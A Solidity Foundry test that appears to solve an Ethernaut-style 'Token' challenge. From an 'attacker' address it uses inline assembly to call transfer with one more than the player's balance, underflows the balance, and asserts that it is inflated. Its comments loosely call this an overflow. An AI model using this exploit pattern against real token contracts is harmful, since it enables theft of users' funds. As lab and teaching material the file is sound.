pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Token.sol";

contract ASMToken is Test {
    Token public token;
    address attacker = address(420);
    uint256 internal supply = 21000000;
    uint256 internal playerSupply = 20;

    function setUp() public {
        token = new Token(supply);
    }

    modifier attack() {
        vm.startPrank(attacker);
        _;
        vm.stopPrank();
    }

    function testAttackToken() public attack {
        assembly {
            // init ptr and store the sig
            let ptr := mload(0x40)
            mstore(ptr, shl(224, 0xa9059cbb)) // "transfer(address,uint256)"

            // unchecked will oveflow if we add 1 to playerSupply by 1
            let overFlowSupply := add(sload(playerSupply.slot), 1)

            // store the data as [selector][zero address][overFlowSupply]
            //                   [0x4]     [0x5..0x24]        [0x25..0x44]
            mstore(add(ptr, 0x4), 0x0)
            mstore(add(ptr, 0x24), overFlowSupply)

            let success := call(gas(), sload(token.slot), 0, ptr, 0x44, 0, 0)
            if eq(success, 0) { revert(0, 0) }
        }

        assertGt(token.balanceOf(attacker), playerSupply);
    }
}
